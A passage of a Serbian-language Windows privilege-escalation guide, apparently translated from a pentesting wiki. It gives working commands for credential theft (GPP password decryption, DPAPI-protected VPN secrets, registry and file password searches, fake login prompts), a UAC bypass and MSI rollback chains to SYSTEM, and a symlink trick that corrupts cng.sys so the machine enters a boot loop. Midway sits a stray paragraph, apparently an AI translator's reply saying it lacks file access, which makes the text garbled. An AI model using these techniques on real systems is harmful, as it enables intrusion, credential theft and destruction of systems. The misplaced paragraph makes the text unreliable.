Da bi se ublažio ovaj rizik, razvijena je funkcija koja skenira lokalno keširane GPP fajlove koji sadrže polje "cpassword" koje nije prazno. Kada pronađe takav fajl, funkcija dekriptuje lozinku i vraća prilagođeni PowerShell object. Ovaj object uključuje detalje o GPP i lokaciju fajla, što pomaže u identifikaciji i otklanjanju ove sigurnosne ranjivosti.

Potraži u `C:\ProgramData\Microsoft\Group Policy\history` ili u _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (pre W Vista)_ ove fajlove:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Za dekriptovanje cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Korišćenje crackmapexec za dobijanje lozinki:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Primer web.config sa credentialima:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN akreditivi
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Logovi
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Traženje kredencijala

Uvek možete **zamoliti korisnika da unese svoje kredencijale ili čak kredencijale drugog korisnika** ako mislite da ih može znati (imajte u vidu da je **direktno traženje** od klijenta za **kredencijale** zaista **rizično**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Moguća imena fajlova koja sadrže kredencijale**

Poznati fajlovi koji su nekada sadržali **lozinke** u **clear-text** ili **Base64** formatu
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Nemam pristup fajlovima u ovom razgovoru, pa ne mogu da pretražim `src/windows-hardening/windows-local-privilege-escalation/README.md` niti druge predložene fajlove dok mi ne pošalješ njihov sadržaj.

Pošalji tekst fajla ili listu fajlova koje treba pretražiti, pa ću uraditi prevod na srpski uz očuvanje iste markdown/HTML sintakse.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Kredencijali u RecycleBin

Takođe treba da proveriš Bin da bi potražio kredencijale unutra

Za **oporavak lozinki** sačuvanih od strane više programa možeš da koristiš: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Unutar registra

**Drugi mogući registry ključevi sa kredencijalima**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Istorija pregledača

Treba da proveriš dbs u kojima su sačuvane lozinke iz **Chrome** ili **Firefox**.\
Takođe proveri istoriju, bookmark-e i favourites pregledača, pa možda su neke **lozinke** sačuvane tamo.

Alati za izvlačenje lozinki iz pregledača:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** je tehnologija ugrađena u Windows operativni sistem koja omogućava **međusobnu komunikaciju** između softverskih komponenti različitih jezika. Svaka COM komponenta je **identifikovana preko class ID (CLSID)**, a svaka komponenta izlaže funkcionalnost preko jedne ili više interfejsa, identifikovanih preko interface IDs (IIDs).

COM klase i interfejsi su definisani u registry pod **HKEY\CLASSES\ROOT\CLSID** i **HKEY\CLASSES\ROOT\Interface** redom. Ovaj registry se kreira spajanjem **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Unutar CLSID-ova ovog registry-ja možeš da pronađeš child registry **InProcServer32** koji sadrži **default value** koja pokazuje na **DLL** i vrednost koja se zove **ThreadingModel** koja može biti **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) ili **Neutral** (Thread Neutral).

![Browsers History - COM DLL Overwriting: Inside the CLSIDs of this registry you can find the child registry InProcServer32 which contains a default value pointing to a DLL and a value...](<../../images/image (729).png>)

U suštini, ako možeš da **overwrite-uješ bilo koji od DLL-ova** koji će biti izvršeni, možeš da **eskaliraš privilegije** ako će taj DLL biti izvršen od strane drugog korisnika.

Da naučiš kako napadači koriste COM Hijacking kao mehanizam za persistence proveri:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

**Search for file contents**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Potraži fajl sa određenim imenom**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Pretražite registry za imena ključeva i lozinke**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Alati koji traže lozinke

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **je msf** plugin koji sam napravio; ovaj plugin automatski izvršava svaki metasploit POST modul koji traži credentials unutar žrtve.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatski traži sve fajlove koji sadrže lozinke pomenute na ovoj stranici.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) je još jedan sjajan alat za izdvajanje lozinki iz sistema.

Alat [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) traži **sessions**, **usernames** i **passwords** raznih alata koji čuvaju ove podatke u plain text-u (PuTTY, WinSCP, FileZilla, SuperPuTTY i RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Zamislite da **proces koji radi kao SYSTEM otvori novi proces** (`OpenProcess()`) sa **punim pristupom**. Isti proces **takođe kreira novi proces** (`CreateProcess()`) **sa niskim privilegijama, ali nasleđujući sve otvorene handle-ove glavnog procesa**.\
Zatim, ako imate **pun pristup procesu sa niskim privilegijama**, možete preuzeti **otvoren handle ka privilegovanom procesu koji je kreiran** pomoću `OpenProcess()` i **ubaciti shellcode**.\
[Pročitajte ovaj primer za više informacija o **tome kako detektovati i eksploatisati ovu ranjivost**.](leaked-handle-exploitation.md)\
[Pročitajte ovaj **drugi post za potpunije objašnjenje o tome kako testirati i zloupotrebiti više otvorenih handle-ova procesa i thread-ova nasledjenih sa različitim nivoima dozvola (ne samo puni pristup)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Deljeni memorijski segmenti, poznati kao **pipes**, omogućavaju komunikaciju između procesa i prenos podataka.

Windows obezbeđuje funkciju nazvanu **Named Pipes**, koja omogućava nepovezanim procesima da dele podatke, čak i preko različitih mreža. Ovo liči na client/server arhitekturu, sa ulogama definisanim kao **named pipe server** i **named pipe client**.

Kada **client** šalje podatke kroz pipe, **server** koji je postavio pipe može da **preuzme identitet** **client-a**, pod uslovom da ima neophodna **SeImpersonate** prava. Identifikovanje **privilegovanog procesa** koji komunicira preko pipe-a koji možete da imititate pruža priliku da **stečete veće privilegije** tako što ćete preuzeti identitet tog procesa kada on stupi u interakciju sa pipe-om koji ste uspostavili. Za uputstva kako da izvedete takav napad, korisni vodiči mogu se naći [**ovde**](named-pipe-client-impersonation.md) i [**ovde**](#from-high-integrity-to-system).

Takođe, sledeći alat omogućava da **presretnete komunikaciju kroz named pipe pomoću alata kao što je burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **a ovaj alat omogućava da izlistate i vidite sve pipe-ove kako biste pronašli privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Telephony servis (TapiSrv) u server modu izlaže `\\pipe\\tapsrv` (MS-TRP). Udaljeni autentifikovani client može da zloupotrebi async putanju zasnovanu na mailslot-u da pretvori `ClientAttach` u proizvoljan **4-byte write** na bilo koji postojeći fajl u koji `NETWORK SERVICE` može da piše, a zatim dobije Telephony admin prava i učita proizvoljan DLL kao servis. Kompletan tok:

- `ClientAttach` sa `pszDomainUser` postavljenim na postojeću putanju koja je upisiva → servis ga otvara preko `CreateFileW(..., OPEN_EXISTING)` i koristi ga za async event writes.
- Svaki event upisuje `InitContext` pod kontrolom napadača iz `Initialize` u taj handle. Registrovati line app sa `LRegisterRequestRecipient` (`Req_Func 61`), okinuti `TRequestMakeCall` (`Req_Func 121`), preuzeti preko `GetAsyncEvents` (`Req_Func 0`), zatim unregister/shutdown da bi se ponavljali deterministički upisi.
- Dodajte sebe u `[TapiAdministrators]` u `C:\Windows\TAPI\tsec.ini`, ponovo se povežite, zatim pozovite `GetUIDllName` sa proizvoljnom putanjom do DLL-a da biste izvršili `TSPI_providerUIIdentify` kao `NETWORK SERVICE`.

Više detalja:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

Pogledajte stranicu **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

Klikabilni Markdown linkovi prosleđeni na `ShellExecuteExW` mogu da okinu opasne URI handlere (`file:`, `ms-appinstaller:` ili bilo koji registrovani scheme) i izvrše fajlove pod kontrolom napadača kao trenutni korisnik. Pogledajte:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

Kada dobijate shell kao korisnik, mogu postojati scheduled tasks ili drugi procesi koji se izvršavaju i **prosleđuju kredencijale na command line-u**. Skripta ispod hvata command line-ove procesa svake dve sekunde i poredi trenutno stanje sa prethodnim, ispisujući sve razlike.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Krađa lozinki iz procesa

## Od Low Priv User do NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Ako imate pristup grafičkom interfejsu (preko konzole ili RDP) i UAC je omogućen, u nekim verzijama Microsoft Windows-a moguće je pokrenuti terminal ili bilo koji drugi proces kao "NT\AUTHORITY SYSTEM" iz neprivilegovanog korisnika.

Ovo omogućava eskalaciju privilegija i zaobilaženje UAC-a u isto vreme uz istu ranjivost. Pored toga, nema potrebe da se bilo šta instalira, a binarna datoteka koja se koristi tokom procesa je potpisana i izdata od strane Microsoft-a.

Neki od pogođenih sistema su sledeći:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Da bi se iskoristila ova ranjivost, potrebno je izvršiti sledeće korake:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## From Administrator Medium to High Integrity Level / UAC Bypass

Pročitajte ovo da biste **naučili o Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Zatim **pročitajte ovo da biste naučili o UAC i UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

Tehnika opisana [**u ovom blog postu**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) sa exploit code [**dostupnim ovde**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Napad se uglavnom sastoji od zloupotrebe Windows Installer rollback feature-a da bi se legitimni fajlovi zamenili malicioznim tokom procesa uninstallacije. Za to napadač mora da napravi **malicious MSI installer** koji će se koristiti za hijack `C:\Config.Msi` foldera, a koji će kasnije Windows Installer koristiti za skladištenje rollback fajlova tokom uninstallacije drugih MSI paketa, pri čemu bi rollback fajlovi bili izmenjeni tako da sadrže malicious payload.

Sažeta tehnika je sledeća:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Kreirajte `.msi` koji instalira bezopasan fajl (npr. `dummy.txt`) u writable folder (`TARGETDIR`).
- Označite installer kao **"UAC Compliant"**, tako da ga **non-admin user** može pokrenuti.
- Zadržite **handle** otvoren za fajl nakon instalacije.

- Step 2: Begin Uninstall
- Uninstall-ujte isti `.msi`.
- Proces uninstall počinje da premešta fajlove u `C:\Config.Msi` i da ih preimenuje u `.rbf` fajlove (rollback backups).
- **Poll the open file handle** koristeći `GetFinalPathNameByHandle` da detektujete kada fajl postane `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- `.msi` uključuje **custom uninstall action (`SyncOnRbfWritten`)** koja:
- Signalizira kada je `.rbf` upisan.
- Zatim **waits** na drugom event-u pre nego što nastavi uninstall.

- Step 4: Block Deletion of `.rbf`
- Kada je signalizirano, **open the `.rbf` file** bez `FILE_SHARE_DELETE` — ovo **sprečava da bude obrisan**.
- Zatim **signal back** tako da uninstall može da se završi.
- Windows Installer ne uspeva da obriše `.rbf`, i zato što ne može da obriše sav sadržaj, **`C:\Config.Msi` nije uklonjen**.

- Step 5: Manually Delete `.rbf`
- Vi (napadač) ručno brišete `.rbf` fajl.
- Sada je **`C:\Config.Msi` empty**, spreman za hijack.

> U ovom trenutku, **trigger-ujte SYSTEM-level arbitrary folder delete vulnerability** da obrišete `C:\Config.Msi`.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Ponovo kreirajte `C:\Config.Msi` folder sami.
- Postavite **weak DACLs** (npr. Everyone:F), i **zadržite handle otvoren** sa `WRITE_DAC`.

- Step 7: Run Another Install
- Install-ujte `.msi` ponovo, sa:
- `TARGETDIR`: Writable location.
- `ERROROUT`: Varijabla koja pokreće forced failure.
- Ova instalacija će se koristiti da ponovo pokrene **rollback**, koji čita `.rbs` i `.rbf`.

- Step 8: Monitor for `.rbs`
- Koristite `ReadDirectoryChangesW` da nadgledate `C:\Config.Msi` dok se ne pojavi novi `.rbs`.
- Zabeležite njegovo ime fajla.

- Step 9: Sync Before Rollback
- `.msi` sadrži **custom install action (`SyncBeforeRollback`)** koja:
- Signalizira event kada se `.rbs` kreira.
- Zatim **waits** pre nego što nastavi.

- Step 10: Reapply Weak ACL
- Nakon što primite event `.rbs created`:
- Windows Installer **ponovo primenjuje jake ACLs** na `C:\Config.Msi`.
- Ali pošto i dalje imate handle sa `WRITE_DAC`, možete **ponovo primeniti weak ACLs**.

> ACLs se **enforcuju samo pri otvaranju handle-a**, tako da i dalje možete da pišete u folder.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Overwrite-ujte `.rbs` fajl sa **fake rollback script** koja govori Windows-u da:
- Restore-uje vaš `.rbf` fajl (malicious DLL) u **privileged location** (npr. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Drop-ujte vaš fake `.rbf` koji sadrži **malicious SYSTEM-level payload DLL**.

- Step 12: Trigger the Rollback
- Signalizirajte sync event tako da installer nastavi.
- A **type 19 custom action (`ErrorOut`)** je podešena da **intentionally fail** instalaciju na poznatoj tački.
- Ovo uzrokuje da **rollback počne**.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- Čita vaš malicious `.rbs`.
- Kopira vaš `.rbf` DLL u target location.
- Sada imate vaš **malicious DLL u SYSTEM-loaded path**.

- Final Step: Execute SYSTEM Code
- Pokrenite trusted **auto-elevated binary** (npr. `osk.exe`) koji učitava DLL koji ste hijack-ovali.
- **Boom**: Vaš code se izvršava **kao SYSTEM**.


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

Glavna MSI rollback tehnika (prethodna) pretpostavlja da možete da obrišete **ceo folder** (npr. `C:\Config.Msi`). Ali šta ako vaša vulnerability dozvoljava samo **arbitrary file deletion** ?

Možete iskoristiti **NTFS internals**: svaki folder ima skriveni alternate data stream koji se zove:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Ovaj stream čuva **index metadata** foldera.

Zato, ako **obrišete `::$INDEX_ALLOCATION` stream** nekog foldera, NTFS **uklanja ceo folder** iz filesystem-a.

To možete uraditi koristeći standardne API-je za brisanje fajlova, kao što su:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Čak i ako pozivate API za brisanje *fajla*, on **briše samu fasciklu**.

### From Folder Contents Delete to SYSTEM EoP
Šta ako tvoj primitive ne dozvoljava brisanje proizvoljnih fajlova/fascikli, ali **dozvoljava brisanje *sadržaja* fascikle pod kontrolom napadača**?

1. Step 1: Setup a bait folder and file
- Kreiraj: `C:\temp\folder1`
- Unutra: `C:\temp\folder1\file1.txt`

2. Step 2: Place an **oplock** on `file1.txt`
- Oplock **pauzira izvršavanje** kada privilegovani proces pokuša da obriše `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Korak 3: Pokreni SYSTEM proces (npr. `SilentCleanup`)
- Ovaj proces skenira foldere (npr. `%TEMP%`) i pokušava da obriše njihov sadržaj.
- Kada stigne do `file1.txt`, **oplock se okida** i predaje kontrolu tvom callback-u.

4. Korak 4: Unutar oplock callback-a – preusmeri brisanje

- Opcija A: Premesti `file1.txt` na drugo mesto
- Ovo prazni `folder1` bez prekidanja oplock-a.
- Nemoj direktno da brišeš `file1.txt` — to bi pre vremena oslobodilo oplock.

- Opcija B: Pretvori `folder1` u **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Opcija C: Kreiraj **symlink** u `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Ovo cilja NTFS interni stream koji čuva metapodatke fascikle — brisanjem njega briše se fascikla.

5. Step 5: Release the oplock
- SYSTEM process continues and tries to delete `file1.txt`.
- But now, due to the junction + symlink, it's actually deleting:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Rezultat**: `C:\Config.Msi` je obrisan od strane SYSTEM-a.

### Od Arbitrary Folder Create do Permanent DoS

Iskoristite primitivu koja vam omogućava da **kreirate proizvoljan folder kao SYSTEM/admin** — čak i ako **ne možete da upisujete fajlove** ili **podesite slabe permisije**.

Kreirajte **folder** (ne fajl) sa imenom **kritičnog Windows drajvera**, npr.:
```
C:\Windows\System32\cng.sys
```
- Ova putanja obično odgovara `cng.sys` kernel-mode driver-u.
- Ako je **pre-kreiraš kao folder**, Windows ne uspeva da učita stvarni driver pri boot-u.
- Zatim Windows pokušava da učita `cng.sys` tokom boot-a.
- Vidí folder, **ne uspeva da resolve-uje stvarni driver**, i **crashuje ili zaustavlja boot**.
- Ne postoji **fallback**, i **nema recovery-ja** bez spoljne intervencije (npr. boot repair ili disk access).

### Od privileged log/backup putanja + OM symlinks do arbitrary file overwrite / boot DoS

Kada **privileged service** piše logove/exporte na putanju pročitanu iz **writable config-a**, preusmeri tu putanju pomoću **Object Manager symlinks + NTFS mount points** da bi privileged write pretvorio u arbitrary overwrite (čak i **bez** SeCreateSymbolicLinkPrivilege).

**Requirements**
- Config koji čuva target putanju je writable za napadača (npr. `%ProgramData%\...\.ini`).
- Mogućnost da se kreira mount point ka `\RPC Control` i OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- Privileged operation koja piše na tu putanju (log, export, report).

**Example chain**
1. Pročitaj config da povratiš privileged log destination, npr. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` u `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Preusmeri putanju bez admin-a:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Sačekajte da privilegovana komponenta upiše log (npr. admin pokrene "send test SMS"). Upis sada završava u `C:\Windows\System32\cng.sys`.
4. Pregledajte prepisanu metu (hex/PE parser) da potvrdite oštećenje; reboot primorava Windows da učita izmenjenu putanju drajvera → **boot loop DoS**. Ovo se takođe generalizuje na bilo koju zaštićenu datoteku koju će privilegovana usluga otvoriti za upis.

> `cng.sys` se normalno učitava iz `C:\Windows\System32\drivers\cng.sys`, ali ako kopija postoji u `C:\Windows\System32\cng.sys` ona može biti pokušana prva, što je čini pouzdanim DoS odredištem za oštećene podatke.



## **From High Integrity to System**

### **New service**

If you are already running on a High Integrity process, the **path to SYSTEM** can be easy just **creating and executing a new service**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Kada kreirate service binary, proverite da li je to validan service ili da li binary obavlja neophodne radnje dovoljno brzo, jer će biti ubijen za 20s ako nije validan service.

### AlwaysInstallElevated

Iz High Integrity procesa možete pokušati da **omogućite AlwaysInstallElevated registry entries** i **instalirate** reverse shell koristeći _**.msi**_ wrapper.\
[Više informacija o uključenim registry keys i o tome kako instalirati _.msi_ package ovde.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Možete** [**naći code ovde**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Ako imate te token privileges (verovatno ćete ovo naći u već High Integrity procesu), moći ćete da **otvorite skoro svaki process** (ne protected processes) sa SeDebug privilegijom, **kopirate token** procesa i kreirate **arbitrary process sa tim tokenom**.\
Ova technique se obično koristi za **bilo koji process koji radi kao SYSTEM sa svim token privileges** (_da, možete naći SYSTEM processes bez svih token privileges_).\
**Možete naći** [**primer code-a koji izvršava predloženu technique ovde**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Ovu technique koristi meterpreter za eskalaciju u `getsystem`. Technique se sastoji od **kreiranja pipe-a i zatim kreiranja/zloupotrebe service-a da piše na taj pipe**. Zatim će **server** koji je kreirao pipe koristeći **`SeImpersonate`** privilegiju moći da **impersonate token** klijenta pipe-a (service-a) i dobije SYSTEM privileges.\
Ako želite da [**saznate više o name pipes, trebalo bi da pročitate ovo**](#named-pipe-client-impersonation).\
Ako želite da pročitate primer [**kako preći sa high integrity na System koristeći name pipes, trebalo bi da pročitate ovo**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Ako uspete da **hijackujete dll** koji se **učitava** od strane **process-a** koji radi kao **SYSTEM**, moći ćete da izvršite arbitrary code sa tim permissions. Zato je Dll Hijacking takođe koristan za ovakvu vrstu privilege escalation, a uz to je i mnogo **lakše postići iz high integrity procesa** jer će imati **write permissions** nad folderima koji se koriste za učitavanje dll-ova.\
**Možete** [**saznati više o Dll hijacking ovde**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Pročitajte:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Najbolji tool za pronalaženje Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Proverava misconfigurations i sensitive files (**[**proverite ovde**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Proverava neke moguće misconfigurations i prikuplja info (**[**proverite ovde**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Proverava misconfigurations**\
